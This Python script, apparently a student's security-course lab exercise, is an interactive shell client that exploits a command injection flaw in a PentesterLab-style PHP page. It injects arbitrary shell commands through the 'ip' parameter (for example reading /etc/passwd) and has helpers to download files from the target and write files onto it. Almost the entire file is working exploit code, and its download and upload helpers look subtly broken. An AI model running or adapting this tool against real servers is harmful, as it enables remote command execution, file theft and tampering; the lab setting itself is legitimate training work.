#!/usr/bin/env python

# Carlos Mendoza - Lab3 Part1 - CSCI4621
# Command Injection Example 1
# An interactive shell client that functions the same as a normal remote bash shell by taking the user input from this program and injecting it as a payload to the url of Command Injection Example 1

import sys
import requests
from urllib.request import urlopen

def interactiveShell():
    global siteIP
	#x = ""
    while True:
        # For each new line in the interactive shell, print "lab3sqli> " to let the user know that they're still in this shell
		# Listen for user input
        inputString = input('lab3sh> ')
		# Exit the shell client the same way you would bash
        if inputString == "exit":
            print('exiting now...')
            break
        # Any other command results in an attempt to get output. Invalid commands result in an error but doesn't crash the program as a whole
        elif inputString.startswith("download "):
            download(siteIP, inputString.split()[1], inputString.split()[2])
        elif inputString.startswith("upload "):
            upload(siteIP, inputString.split()[1], inputString.split()[2])
        else:
            try:
                # To accept commands like cat /etc/passwd
                inputString = inputString.replace(" ", "+")
                url = f"http://{siteIP}/commandexec/example1.php?ip=127.0.0.1;+echo+STARTHERE;+{inputString}"
                page = urlopen(url)
                pageText = page.read()
                pageTextDecoded = pageText.decode("utf-8")
                td_index = pageTextDecoded.find("STARTHERE\n")
                start_index = td_index + len("STARTHERE\n")
                end_index = pageTextDecoded.find("</pre>")
                output = pageTextDecoded[start_index:end_index]
                print(output)
            except:
                print("Invalid Input.\n")
    return


def download(site_ip, remote_file, local_file):
    response = requests.get(f"http://{site_ip}/commandexec/example1.php", params={"ip": f"cat {remote_file}"})
    
    if response.status_code == 200:
        with open(local_file, 'wb') as f:
            f.write(response.content)
        print(f"Downloaded remote file: {remote_file} to local file: {local_file}")
    else:
        print(f"Error downloading remote file: {remote_file} to local file: {local_file}")

def upload(site_ip, local_file, remote_file):
    with open(local_file, 'rb') as f:
        content = f.read()
    
    response = requests.post(f"http://{site_ip}/commandexec/example1.php", data={"ip": f"echo '{content}' > {remote_file}"})
    
    if response.status_code == 200:
        print(f"Uploaded local file: {local_file} to remote file: {remote_file}")
    else:
        print(f"Error uploading local file: {local_file} to remote file: {remote_file}")



if __name__ == "__main__":
	args = sys.argv[1:]
	# In my case, the IP address of the pentester lab site, using ifconfig, was 192.168.56.101
	siteIP = args[0]
	interactiveShell()